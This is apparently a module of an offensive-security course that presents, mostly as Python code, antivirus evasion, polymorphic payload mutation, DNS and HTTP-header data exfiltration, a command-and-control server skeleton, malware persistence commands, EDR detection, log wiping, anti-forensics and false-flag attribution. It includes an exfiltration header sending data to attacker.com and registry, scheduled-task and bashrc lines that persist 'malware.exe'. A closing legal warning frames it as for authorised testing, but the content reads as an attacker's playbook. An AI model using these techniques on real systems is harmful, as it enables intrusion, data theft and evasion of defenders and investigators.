# Module 8: Advanced Evasion & OPSEC

## 8.1 Antivirus Evasion Techniques

```python
import base64
import hashlib
import random
import string

class AVEvasionFramework:
    """
    Techniques to bypass antivirus detection
    """
    
    @staticmethod
    def signature_based_evasion():
        """
        Antivirus uses signatures (byte patterns) to detect malware
        Methods to evade:
        1. Encode payload
        2. Polymorphic changes
        3. Randomization
        4. Obfuscation
        """
        
        # Original malware signature (simplified)
        signature = b"\x48\x89\xe5\x48\x83\xec\x10"
        
        # Detection: Look for this exact sequence
        # Evasion: Change it slightly
        
        evasion_methods = [
            ("XOR Encoding", b"encoded_payload_here"),
            ("Insertion of NOPs", b"\x90\x48\x89\xe5\x90\x48\x83\xec\x10"),
            ("Reordering", b"\x48\x83\xec\x10\x48\x89\xe5"),
            ("Alternative instructions", b"different_but_same_result"),
        ]
        
        return evasion_methods
    
    @staticmethod
    def polymorphic_engine():
        """
        Generate different variants of malware each time
        Each variant different but functionally identical
        """
        
        class PolymorphicPayload:
            def __init__(self, original_code):
                self.original = original_code
                self.variants = []
            
            def generate_variants(self, count=10):
                """Generate multiple variations"""
                
                for _ in range(count):
                    variant = self._mutate()
                    self.variants.append(variant)
                
                return self.variants
            
            def _mutate(self):
                """Apply random mutation"""
                
                mutations = [
                    self._insert_garbage,
                    self._reorder_instructions,
                    self._encode_decode,
                    self._add_junk_jumps,
                ]
                
                mutator = random.choice(mutations)
                return mutator(self.original)
            
            def _insert_garbage(self, code):
                """Insert non-functional code"""
                garbage = [
                    b"\x90",  # NOP
                    b"\x89\xc0",  # mov eax, eax
                    b"\x68\x00\x00\x00\x00\x58",  # push 0; pop rax
                ]
                
                mutated = bytearray()
                for i, byte in enumerate(code):
                    if random.random() < 0.1:  # 10% chance
                        mutated.extend(random.choice(garbage))
                    mutated.append(byte)
                
                return bytes(mutated)
            
            def _reorder_instructions(self, code):
                """Reorder independent instructions"""
                # This requires understanding instruction semantics
                pass
            
            def _encode_decode(self, code):
                """Encode payload and add decoder"""
                key = random.randint(1, 255)
                encoded = bytes([b ^ key for b in code])
                
                # Decoder: XOR with key
                # Simplified - real decoder is more complex
                return encoded
            
            def _add_junk_jumps(self, code):
                """Add jumps over garbage"""
                pass
        
        return PolymorphicPayload
    
    @staticmethod
    def behavioral_evasion():
        """
        Evade behavioral/heuristic detection
        """
        
        evasion_tricks = {
            "Sleep before execution": "AV pauses monitoring after sleep()",
            "VM/Debugger detection": "Don't run if in virtual machine",
            "Geolocation check": "Only run in certain countries",
            "Date check": "Don't activate before specific date",
            "Registry check": "Check Windows registry for AV",
            "Process check": "Check for debuggers/AV processes",
            "User interaction": "Require user click to execute",
        }
        
        return evasion_tricks
    
    @staticmethod
    def code_injection_evasion():
        """
        Inject into trusted process instead of standalone exe
        """
        
        # Classic: exe -> AV detects -> blocked
        # Evasion: Inject into trusted process (svchost, explorer) -> harder to detect
        
        def inject_into_process(target_process, shellcode):
            """
            Windows: Use CreateRemoteThread or NtCreateThreadEx
            Linux: Use ptrace or shared library injection
            """
            
            # Simplified pseudocode
            # 1. Open target process
            # 2. Allocate memory in target
            # 3. Copy shellcode to allocated memory
            # 4. Create thread executing shellcode
            
            pass
    
    @staticmethod
    def dll_hijacking():
        """
        Legitimate application loads malicious DLL
        """
        
        # Windows loads DLLs in specific order:
        # 1. Application directory
        # 2. Windows system directory
        # 3. PATH environment variable
        
        # Attack: Place malicious DLL in app directory
        # App loads our DLL instead of legitimate one
        # AV doesn't suspect the app
        
        dll_hijack_targets = [
            "mscoree.dll",
            "ole32.dll",
            "kernel32.dll",
        ]
        
        return dll_hijack_targets
    
    @staticmethod
    def executable_modification():
        """
        Modify legitimate executable to carry payload
        """
        
        # Techniques:
        # 1. Code cave injection: Write to unused space in executable
        # 2. Section header modification: Change section properties
        # 3. Entry point modification: Change program entry point
        # 4. Binary packing: Add UPX packing
        
        # Result: Legitimate executable + malware
        # Harder for AV to detect
        pass
```

## 8.2 Network-Based Evasion

```python
def network_evasion_techniques():
    """
    Bypass network-based detection
    """
    
    techniques = {
        "DNS Tunneling": "Send data through DNS queries",
        "HTTP Tunneling": "Disguise traffic as normal HTTP",
        "Encrypted Channel": "Use TLS to hide traffic from IDS",
        "Tor/VPN": "Route through anonymization network",
        "Traffic Mimicry": "Copy patterns of legitimate traffic",
        "Slow Exfiltration": "Leak data slowly to avoid threshold alerts",
        "Fragmentation": "Split suspicious patterns across packets",
        "Protocol Anomalies": "Use unexpected but valid protocol features",
    }
    
    return techniques

class TrafficObfuscator:
    """
    Hide malicious network traffic
    """
    
    @staticmethod
    def dns_tunneling(data, attacker_ns):
        """
        Send data through DNS queries
        Firewall typically allows DNS
        """
        
        # Split data into DNS query labels
        # 2a3f4c... -> 2a3f4c.com
        # Attacker's DNS server logs queries
        
        def encode_data_as_dns(data):
            hex_data = data.hex()
            
            # DNS labels max 63 chars
            labels = []
            for i in range(0, len(hex_data), 63):
                label = hex_data[i:i+63]
                labels.append(label)
            
            # Form domain: label1.label2.attacker.com
            domain = '.'.join(labels) + f".{attacker_ns}"
            return domain
        
        # Query domain
        # Attacker intercepts and decodes
        return encode_data_as_dns
    
    @staticmethod
    def http_header_exfiltration(data):
        """
        Hide data in HTTP headers
        """
        
        # Common headers misused:
        # User-Agent, Referer, Cookie, X-Custom-Header
        
        headers = {
            "User-Agent": f"Mozilla/5.0 {base64.b64encode(data[:20]).decode()}",
            "X-Data": base64.b64encode(data).decode(),
            "Referer": f"http://attacker.com?data={data.hex()}",
        }
        
        return headers
    
    @staticmethod
    def covert_channel_timing():
        """
        Send data through timing of packets
        """
        
        # Example: Morse code via packet timing
        # Short delay = dot, long delay = dash
        
        def encode_timing(message):
            # ASCII -> Binary -> Timing pattern
            
            morse_code = {
                'A': '.-',
                'B': '-...',
                # ... etc
            }
            
            timings = []
            for char in message:
                morse = morse_code.get(char.upper(), '')
                for symbol in morse:
                    if symbol == '.':
                        timings.append(0.1)  # Short delay
                    else:
                        timings.append(0.3)  # Long delay
                    timings.append(0.05)  # Gap
            
            return timings
```

## 8.3 Operational Security (OPSEC)

```python
class OPSECFramework:
    """
    Operational security for red team operations
    """
    
    @staticmethod
    def compartmentalization():
        """
        Separate operations to limit exposure
        """
        
        principles = {
            "Different IPs": "Use separate IPs for each target",
            "Different identities": "Create unique personas",
            "Isolated networks": "Use different VPNs/proxies",
            "Separate tools": "Different malware for each operation",
            "Time separation": "Vary timing of activities",
        }
        
        return principles
    
    @staticmethod
    def anonymization():
        """
        Hide true identity and location
        """
        
        # Use Tor for web
        import subprocess
        
        def browse_anonymously():
            # Route through Tor
            # Use Tails OS or Whonix
            pass
        
        # VPN + Proxy + Tor layers
        # DNS over HTTPS
        # Remailer services for email
        
        return "Multiple anonymization layers"
    
    @staticmethod
    def secure_communication():
        """
        Communicate without leaving traces
        """
        
        methods = {
            "Signal": "E2E encrypted messaging",
            "ProtonMail": "Encrypted email",
            "Wickr": "Self-destructing messages",
            "Steganography": "Hide messages in images",
        }
        
        return methods
    
    @staticmethod
    def log_removal():
        """
        Clean up traces after operation
        WARNING: Illegal in most jurisdictions
        """
        
        # Check what's logged:
        # - Web server logs
        # - Firewall logs
        # - IDS/IPS logs
        # - Syslog
        # - Application logs
        
        # Removal techniques:
        # - SQL injection into log database
        # - Direct file modification if shell access
        # - Overwrite logs with noise
        # - Target log archival systems
        
        print("[!] Log removal is illegal without authorization")
        pass
    
    @staticmethod
    def counter_forensics():
        """
        Prevent evidence recovery
        """
        
        techniques = {
            "Secure delete": "Overwrite deleted files (shred -vfz)",
            "Disk encryption": "Full disk encryption",
            "Memory wipe": "Overwrite sensitive data in RAM",
            "Timestomp": "Modify file timestamps",
            "Anti-forensic tools": "DBAN, Eraser, CCleaner",
        }
        
        return techniques
    
    @staticmethod
    def attribution_decoys():
        """
        Create false attribution
        """
        
        # Use tools/techniques associated with different groups
        # Leave breadcrumbs pointing to decoy attacker
        # Confuse threat intelligence analysts
        
        # WARNING: Attribution false flags cause serious issues
        # Only for authorized authorized operations
        
        pass
```

## 8.4 Command & Control (C2) Infrastructure

```python
class C2Infrastructure:
    """
    Command and control server for managing compromised systems
    """
    
    def __init__(self, listener_port=8080):
        self.listener_port = listener_port
        self.compromised_hosts = {}
        self.command_queue = {}
    
    def register_agent(self, agent_id, hostname, user, ip):
        """
        Register compromised system
        """
        self.compromised_hosts[agent_id] = {
            'hostname': hostname,
            'user': user,
            'ip': ip,
            'last_seen': __import__('time').time(),
            'commands': []
        }
        print(f"[+] Agent registered: {agent_id} ({hostname})")
    
    def queue_command(self, agent_id, command):
        """
        Send command to compromised system
        """
        if agent_id in self.command_queue:
            self.command_queue[agent_id].append(command)
        else:
            self.command_queue[agent_id] = [command]
    
    def get_pending_commands(self, agent_id):
        """
        Agent checks for commands
        """
        return self.command_queue.get(agent_id, [])
    
    def exfiltrate_data(self, agent_id, data):
        """
        Receive stolen data from agent
        """
        print(f"[+] Data received from {agent_id}: {len(data)} bytes")
    
    def maintain_persistence(self, agent_id):
        """
        Ensure agent survives reboot
        """
        
        commands = {
            "Windows": [
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\malware.exe",
                "schtasks /create /tn Updater /tr C:\\malware.exe /sc onlogon",
            ],
            "Linux": [
                "crontab -e # */5 * * * * /tmp/malware",
                "echo '/tmp/malware' >> ~/.bashrc",
            ]
        }
        
        return commands
```

## 8.5 Incident Response Evasion

```python
class IncidentResponseEvasion:
    """
    Evade incident response techniques
    """
    
    @staticmethod
    def detect_edrs():
        """
        Identify Endpoint Detection & Response tools
        """
        
        common_edrs = [
            "CrowdStrike Falcon",
            "Microsoft Defender",
            "Sophos",
            "Kaspersky",
            "Carbon Black",
            "Tanium",
        ]
        
        # Check process list, registry, running services
        # If EDR detected, use different tactics
        
        def check_for_edr():
            import subprocess
            
            processes = subprocess.run(['tasklist'], capture_output=True, text=True)
            
            for edr in common_edrs:
                if edr.lower() in processes.stdout.lower():
                    return edr
            
            return None
        
        return check_for_edr
    
    @staticmethod
    def living_off_the_land():
        """
        Use legitimate Windows utilities instead of malware tools
        """
        
        techniques = {
            "PowerShell": "Code execution, lateral movement",
            "WMI": "Remote code execution",
            "PsExec": "Remote command execution (legitimate tool)",
            "certutil": "Download files",
            "bitsadmin": "Download/upload files",
            "regsvcs": "Code execution via .NET",
            "cscript/wscript": "Script execution",
        }
        
        return techniques
    
    @staticmethod
    def blend_in():
        """
        Appear as normal user/admin activity
        """
        
        # Access legitimate files
        # Use common applications
        # Time activities during business hours
        # Match behavior to user profile
        # Use legitimate accounts
        
        pass
```

---

## Summary
- AV evasion uses encoding, obfuscation, behavior changes
- Polymorphic malware changes signature each time
- Network evasion hides malware traffic
- OPSEC protects attacker identity
- C2 infrastructure manages compromised systems
- Living off the land uses legitimate tools

## IMPORTANT LEGAL WARNING
This information is for authorized security testing only. Unauthorized access is illegal. Violators face federal prosecution with penalties up to 10 years imprisonment and $250,000 fines.

## Next Steps
- Study purple team techniques
- Learn detection methods
- Understand defensive evasion
- Study incident response
